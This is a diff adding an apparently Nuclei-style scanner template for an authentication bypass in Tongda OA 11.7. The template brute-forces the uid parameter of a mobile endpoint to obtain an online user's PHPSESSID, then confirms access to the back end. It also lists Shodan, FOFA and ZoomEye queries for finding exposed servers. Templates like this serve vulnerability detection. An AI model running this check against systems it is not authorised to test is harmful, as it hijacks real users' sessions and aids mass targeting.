@@ -1,0 +1,44 @@
+id: tongda-auth-bypass
+
+info:
+  name: Tongda OA 11.7 - Authentication Bypass
+  author: HuTa0
+  severity: high
+  description: |
+    Tongda OA is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., LTD v11.7 has the interface query online user function, when the user is online, it will return PHPSESSION so that it can log in to the background system.
+  reference:
+    - https://s1xhcl.github.io/2021/03/13/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/
+  classification:
+    cpe: cpe:2.3:a:tongda2000:office_anywhere:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 200
+    vendor: tongda2000
+    product: office_anywhere
+    shodan-query: title:"通达OA"
+    fofa-query: title="通达OA"
+    zoomeye-query: app="通达OA"
+  tags: tongda,auth-bypass,fuzz
+
+http:
+  - raw:
+      - |
+        GET /mobile/auth_mobi.php?isAvatar=1&uid={{uid}}&P_VER=0 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /general/ HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      uid: helpers/wordlists/numbers.txt
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body_1) == 0"
+          - '!contains(body_1, "RELOGIN")'
+          - "contains(header_1,'PHPSESSID=')"
+          - "status_code_1 == 200 && status_code_2 == 200"
+          - "contains(body_2,'user_id:') && contains(body_2,'user_name:') && contains(body_2,'var loginUser')"
+        condition: and
+# digest: 4a0a00473045022100bd4994d618784a6304cc3653abc14baa9323fe03adca20f851dbe92e8c30dbd1022055d7fbeaea2dbf8d669420408cf9d771a260b0b394899c585bbb1a8208031340:922c64590222798bb761d5b6d8e72950
